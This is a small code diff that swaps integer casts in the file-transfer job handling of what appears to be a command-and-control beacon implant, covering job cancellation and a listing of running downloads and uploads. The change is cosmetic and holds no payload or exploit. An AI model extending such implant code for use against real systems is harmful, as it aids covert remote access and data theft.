@@ -717,7 +717,7 @@ BOOL TransferCancelJob(BeaconContext* ctx, UINT32 job_id, ByteBuf* out)
     LeaveCriticalSection(&tm->lock);
 
     if (found) {
-        BbPrintf(out, "%s job %lu canceled", type, (unsigned long)job_id);
+        BbPrintf(out, "%s job %lu canceled", type, (ULONG)job_id);
     }
     return found;
 }
@@ -734,11 +734,11 @@ VOID TransferAppendJobs(TransferManager* tm, ByteBuf* out, SIZE_T* count, ULONGL
     for (d = tm->downloads; d; d = d->next) {
         ULONGLONG age = now >= d->started_at ? now - d->started_at : 0;
         BbPrintf(out, "%-10lu  %-10s  %-10s  %-9I64u  %-9lu  %-10s  %-18s  %s\n",
-                 (unsigned long)d->original_task_id,
+                 (ULONG)d->original_task_id,
                  "download",
                  "running",
                  (unsigned __int64)age,
-                 (unsigned long)BEACON_COMMAND_DOWNLOAD,
+                 (ULONG)BEACON_COMMAND_DOWNLOAD,
                  "download",
                  d->task_id[0] ? d->task_id : "-",
                  d->remote[0] ? d->remote : "-");
@@ -747,11 +747,11 @@ VOID TransferAppendJobs(TransferManager* tm, ByteBuf* out, SIZE_T* count, ULONGL
     for (u = tm->uploads; u; u = u->next) {
         ULONGLONG age = now >= u->started_at ? now - u->started_at : 0;
         BbPrintf(out, "%-10lu  %-10s  %-10s  %-9I64u  %-9lu  %-10s  %-18s  %s\n",
-                 (unsigned long)u->original_task_id,
+                 (ULONG)u->original_task_id,
                  "upload",
                  "running",
                  (unsigned __int64)age,
-                 (unsigned long)BEACON_COMMAND_UPLOAD,
+                 (ULONG)BEACON_COMMAND_UPLOAD,
                  "upload",
                  u->task_id[0] ? u->task_id : "-",
                  u->remote[0] ? u->remote : "-");
